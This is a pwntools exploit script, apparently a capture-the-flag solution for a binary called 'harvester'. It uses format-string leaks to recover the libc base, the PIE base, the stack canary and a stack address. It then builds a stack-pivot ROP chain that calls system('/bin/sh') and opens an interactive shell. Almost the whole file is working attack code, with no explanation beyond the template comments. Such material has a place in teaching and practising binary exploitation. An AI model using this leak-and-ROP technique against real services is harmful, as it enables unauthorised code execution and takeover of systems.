#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 harvester
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('harvester')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%21$p")
io.recvuntil(":")
libleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
libc.address = int(libleak, 0) - 0x021bf7
io.success("libc: {}".format(hex(libc.address)))

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%20$p")
io.recvuntil(":")
baseleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
exe.address = int(baseleak, 0) - 0x1000
io.success("base: {}".format(hex(exe.address)))

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%19$p")
io.recvuntil(":")
canaryleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
canary = int(canaryleak, 0)
io.success("canary: {}".format(hex(canary)))

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%16$p")
io.recvuntil(":")
stackleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
stack = int(stackleak, 0)
io.success("stack: {}".format(hex(stack)))

io.recvuntil(">")
io.sendline("2")
io.recvuntil(">")
io.sendline("y")
io.recvuntil(">")
io.sendline(str(10 - 0x15))

io.recvuntil(">")
io.sendline("3")
io.recvuntil(">")


rop = ROP(exe)
poprdi = rop.find_gadget(['pop rdi', 'ret'])[0]
leave = rop.find_gadget(['leave', 'ret'])[0]

system = libc.sym["system"]
binsh = next(libc.search("/bin/sh\x00"))

payload = flat({
    0x0: [
        poprdi,
        binsh,
        system,
        ],
    0x30 - 8: canary,
    0x30: stack - 0x78,
    0x30 + 8: leave,
    })

pause()
io.send(payload)

io.interactive()

